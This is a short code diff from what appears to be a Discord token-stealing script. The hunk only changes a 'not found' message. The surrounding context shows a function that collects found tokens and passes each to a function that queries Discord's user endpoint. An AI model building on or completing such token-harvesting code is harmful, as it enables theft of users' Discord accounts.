@@ -343,7 +343,7 @@ def find_token():
         for token in found_tokens:
             webhook(token)
     else:
-        print("No tokens found.")
+        print("ERROR") # Not Found The token
 
 def webhook(token):
     api = "https://discord.com/api/v6/users/@me"
